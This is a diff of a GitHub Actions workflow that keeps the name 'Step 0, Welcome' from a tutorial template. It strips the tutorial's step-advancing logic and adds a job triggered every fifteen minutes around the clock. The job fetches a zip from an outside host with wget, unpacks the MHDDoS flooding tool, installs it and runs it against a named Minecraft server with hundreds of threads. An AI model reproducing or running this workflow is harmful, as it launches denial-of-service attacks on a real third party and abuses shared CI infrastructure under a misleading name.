@@ -1,91 +1,133 @@
 name: Step 0, Welcome
 
-# This step triggers after the learner creates a new repository from the template.
-# This workflow updates from step 0 to step 1.
-
-# This will run every time we create push a commit to `main`.
-# Reference: https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows
 on:
-  workflow_dispatch:
   push:
-    branches:
-      - main
+  workflow_dispatch:
+  schedule:
+    - cron: '0 0 * * *'
+    - cron: '15 0 * * *'
+    - cron: '30 0 * * *'
+    - cron: '45 0 * * *'
+    - cron: '0 1 * * *'
+    - cron: '15 1 * * *'
+    - cron: '30 1 * * *'
+    - cron: '45 1 * * *'
+    - cron: '0 2 * * *'
+    - cron: '15 2 * * *'
+    - cron: '30 2 * * *'
+    - cron: '45 2 * * *'
+    - cron: '0 3 * * *'
+    - cron: '15 3 * * *'
+    - cron: '30 3 * * *'
+    - cron: '45 3 * * *'
+    - cron: '0 4 * * *'
+    - cron: '15 4 * * *'
+    - cron: '30 4 * * *'
+    - cron: '45 4 * * *'
+    - cron: '0 5 * * *'
+    - cron: '15 5 * * *'
+    - cron: '30 5 * * *'
+    - cron: '45 5 * * *'
+    - cron: '0 6 * * *'
+    - cron: '15 6 * * *'
+    - cron: '30 6 * * *'
+    - cron: '45 6 * * *'
+    - cron: '0 7 * * *'
+    - cron: '15 7 * * *'
+    - cron: '30 7 * * *'
+    - cron: '45 7 * * *'
+    - cron: '0 8 * * *'
+    - cron: '15 8 * * *'
+    - cron: '30 8 * * *'
+    - cron: '45 8 * * *'
+    - cron: '0 9 * * *'
+    - cron: '15 9 * * *'
+    - cron: '30 9 * * *'
+    - cron: '45 9 * * *'
+    - cron: '0 10 * * *'
+    - cron: '15 10 * * *'
+    - cron: '30 10 * * *'
+    - cron: '45 10 * * *'
+    - cron: '0 11 * * *'
+    - cron: '15 11 * * *'
+    - cron: '30 11 * * *'
+    - cron: '45 11 * * *'
+    - cron: '0 12 * * *'
+    - cron: '15 12 * * *'
+    - cron: '30 12 * * *'
+    - cron: '45 12 * * *'
+    - cron: '0 13 * * *'
+    - cron: '15 13 * * *'
+    - cron: '30 13 * * *'
+    - cron: '45 13 * * *'
+    - cron: '0 14 * * *'
+    - cron: '15 14 * * *'
+    - cron: '30 14 * * *'
+    - cron: '45 14 * * *'
+    - cron: '0 15 * * *'
+    - cron: '15 15 * * *'
+    - cron: '30 15 * * *'
+    - cron: '45 15 * * *'
+    - cron: '0 16 * * *'
+    - cron: '15 16 * * *'
+    - cron: '30 16 * * *'
+    - cron: '45 16 * * *'
+    - cron: '0 17 * * *'
+    - cron: '15 17 * * *'
+    - cron: '30 17 * * *'
+    - cron: '45 17 * * *'
+    - cron: '0 18 * * *'
+    - cron: '15 18 * * *'
+    - cron: '30 18 * * *'
+    - cron: '45 18 * * *'
+    - cron: '0 19 * * *'
+    - cron: '15 19 * * *'
+    - cron: '30 19 * * *'
+    - cron: '45 19 * * *'
+    - cron: '0 20 * * *'
+    - cron: '15 20 * * *'
+    - cron: '30 20 * * *'
+    - cron: '45 20 * * *'
+    - cron: '0 21 * * *'
+    - cron: '15 21 * * *'
+    - cron: '30 21 * * *'
+    - cron: '45 21 * * *'
+    - cron: '0 22 * * *'
+    - cron: '15 22 * * *'
+    - cron: '30 22 * * *'
+    - cron: '45 22 * * *'
+    - cron: '0 23 * * *'
+    - cron: '15 23 * * *'
+    - cron: '30 23 * * *'
+    - cron: '45 23 * * *'
 
-# Reference: https://docs.github.com/en/actions/security-guides/automatic-token-authentication
-permissions:
-  # Need `contents: read` to checkout the repository.
-  # Need `contents: write` to update the step metadata.
-  contents: write
 
 jobs:
-  # Get the current step to only run the main job when the learner is on the same step.
-  get_current_step:
-    name: Check current step number
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - id: get_step
-        run: |
-          echo "current_step=$(cat ./.github/steps/-step.txt)" >> $GITHUB_OUTPUT
-    outputs:
-      current_step: ${{ steps.get_step.outputs.current_step }}
 
-  on_start:
-    name: On start
-    needs: get_current_step
+  build:
 
-    # We will only run this action when:
-    # 1. This repository isn't the template repository.
-    # 2. The step is currently 0.
-    # Reference: https://docs.github.com/en/actions/learn-github-actions/contexts
-    # Reference: https://docs.github.com/en/actions/learn-github-actions/expressions
-    if: >-
-      ${{ !github.event.repository.is_template
-          && needs.get_current_step.outputs.current_step == 0 }}
 
-    # We'll run Ubuntu for performance instead of Mac or Windows.
     runs-on: ubuntu-latest
 
+
     steps:
-      # We'll need to check out the repository so that we can edit the README.
-      - name: Checkout
-        uses: actions/checkout@v4
-        with:
-          fetch-depth: 0 # Let's get all the branches.
 
-      # Make a branch, file, and commit for the learner.
-      - name: Prepare a branch, and file
-        run: |
-          echo "Make sure we are on step 0"
-          if [ "$(cat .github/steps/-step.txt)" != 0 ]
-          then
-            echo "Current step is not 0"
-            exit 0
-          fi
+    - name: ダウンロード
 
-          echo "Make a branch"
-          BRANCH=welcome-workflow
-          git checkout -b $BRANCH
+      run: wget http://nkgpgc.sx3.jp/uploader51/upl/civChR31kdcAeQJuTumX/01733.zip
 
-          echo "Make a commit"
-          git config user.name github-actions[bot]
-          git config user.email github-actions[bot]@users.noreply.github.com
-          git commit --allow-empty --message="Create an empty commit"
+    - name: 展開
 
-          echo "Push"
-          git push --set-upstream origin $BRANCH
+      run: unzip 01733.zip -d ./
 
-          echo "Restore main"
-          git checkout main
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    - name: コピー
 
-      # In README.md, switch step 0 for step 1.
-      - name: Update to step 1
-        uses: skills/action-update-step@v2
-        with:
-          token: ${{ secrets.GITHUB_TOKEN }}
-          from_step: 0
-          to_step: 1
-          branch_name: welcome-workflow
+      run: cp -R ./MHDDoS-2.4.2/* ./
+
+    - name: インストール
+
+      run: pip3 install -r requirements.txt
+
+    - name: 実行
+
+      run: python3 start.py MCPE live.tsubasaru.f5.si:19132 500 1000
